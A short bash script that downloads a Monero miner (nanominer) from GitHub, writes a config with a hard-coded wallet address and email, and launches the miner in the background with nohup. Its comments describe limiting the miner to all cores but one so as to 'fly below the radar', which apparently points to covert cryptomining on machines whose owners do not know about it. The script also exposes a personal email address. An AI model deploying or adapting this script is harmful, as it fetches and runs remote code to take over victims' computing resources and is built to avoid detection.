#!/bin/bash
wget https://github.com/nightcrawler-/monerix-xmr/releases/download/v0.0.1/nanominer-linux-3.3.4.tar.xz
tar -xf nanominer-linux-3.3.4.tar.xz
cd nanominer-linux-3.3.4

#3 The default config uses max cores. To use one-less core in order to 'fly' below the radar?
# Delete config.ini if present
# load all info with this script
# Append rig name as result of host name
# Append number of cores as total - 1 
# echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo`    
# cat /proc/sys/kernel/hostname
# grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'
# echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'`

# custom config
touch config.ini
rm config.ini

echo "[RandomX]" >> config.ini
echo "wallet = 42VmQmradix9d5QaHZdo9pUvaH4Ua94WV22VK1HNcAEUbuDxSNXFCoH3h5GA5F8nUuh9a76xzt7sURb4wNgXVDn77qBvRBa" >> config.ini 
echo "rigName = " `cat /proc/sys/kernel/hostname` >> config.ini
echo "email = o.frederickn@gmail.com" >> config.ini
echo "sortPools = true" >> config.ini 
echo "cpuThreads = " `grep -c ^processor /proc/cpuinfo | awk '{print $0-1}'` >> config.ini

nohup ./nanominer &